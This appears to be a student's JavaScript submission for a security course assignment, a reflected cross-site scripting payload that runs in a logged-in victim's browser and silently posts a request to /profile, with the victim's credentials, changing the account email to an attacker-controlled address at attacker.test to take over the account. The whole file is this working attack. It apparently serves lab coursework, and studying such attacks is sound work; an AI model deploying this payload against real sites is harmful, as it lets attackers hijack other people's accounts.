// B.2 reflected XSS -> account takeover payload (FIT5003 A2, student 35314516)
// Runs in a logged-in victim's browser and changes their account email.
fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=pwned-35314516@attacker.test",
  credentials: "include"
}).then(function () {
  console.log("account takeover: email changed by 35314516");
});
